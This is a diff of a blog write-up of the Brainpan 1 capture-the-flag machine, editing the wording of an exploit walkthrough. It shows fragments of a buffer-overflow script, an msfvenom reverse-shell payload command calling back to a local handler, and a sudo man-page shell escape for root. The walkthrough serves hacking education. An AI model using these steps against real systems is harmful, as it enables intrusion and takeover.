@@ -130,7 +130,7 @@ From previous fuzzing I discovered that character sequence of approximately 600 
 import socket
 import time
 
-TARGET = "192.168.0.228" #228 for my windows VM
+TARGET = "192.168.0.228" #192.168.0.228 for my windows VM
 PORT = 9999
 PAYLOAD = "A" * 600
 
@@ -188,7 +188,7 @@ All the addresses end with a null byte which makes it hard / impossible to jump 
 
 <img src="/img/blog/brainpan1/brainpan1-10.png">
 
-That means that if we overwrite the address of a `jmp esp` instruction we can hop right into our shellcode! Use `CTRL-F`, search for the instruction and copy the address.
+That means that if we overwrite the return address with `jmp esp` instruction we can hop right into our shellcode! Use `CTRL-F`, search for the instruction and copy the address.
 
 <img src="/img/blog/brainpan1/brainpan1-07.png">  
 
@@ -202,7 +202,7 @@ import socket
 import struct
 import time
 
-TARGET = "192.168.0.228" #110 for brainpan
+TARGET = "192.168.0.228" #.110 for brainpan 
 PORT = 9999
 
 PADDING = "A" * 524
@@ -278,12 +278,11 @@ If done correctly the reverse shell should arrive to the handler you set up via 
 
 Concept of  BOFs is kind of complicated and describing it within one blogpost is impossible. I highly recommend binary hacking series by [LiveOverflow](https://www.youtube.com/playlist list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN) to begin learning if anything is unclear. 
 
-Now that we have the exploit figured out, replace the shellcode with linux one (`msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.0.66 LPORT=3333 -f py -b '\x00'`) and re-run it on original Brainpan machine (**192.168.0.110**).  
+Now that we have the exploit figured out, replace the windows shellcode with linux one (`msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.0.66 LPORT=3333 -f py -b '\x00'`) and re-run it on original Brainpan machine (**192.168.0.110**).  
 
 <img src="/img/blog/brainpan1/brainpan1-09.png">
 
 > TIP: `python -c 'import pty; pty.spawn("/bin/sh")'` = A TTY shell for easier console interaction
-**Check out [NetSec article](https://netsec.ws/?p=337) for more TTYs if needed!** 
 
 Reverse shell has been achieved ;) !
 
@@ -304,7 +303,7 @@ User puck may run the following commands on this host:
     (root) NOPASSWD: /home/anansi/bin/anansi_util
 
 ```
-`anansi_util` allows running *manual* with *sudo* which is a dangerous combination because it can be easily chained together for easy root escalation. Open up a random man page (`man whoami` in my case) and execute a shell by typing `!/bin/sh`.
+`anansi_util` allows running *manual* and *sudo* which is a dangerous combination because it can be easily chained together for easy root escalation. Open up a random man page (`man whoami` in my case) and execute a shell by typing `!/bin/sh`.
 
 ```console
 sudo /home/anansi/bin/anansi_util manual whoami
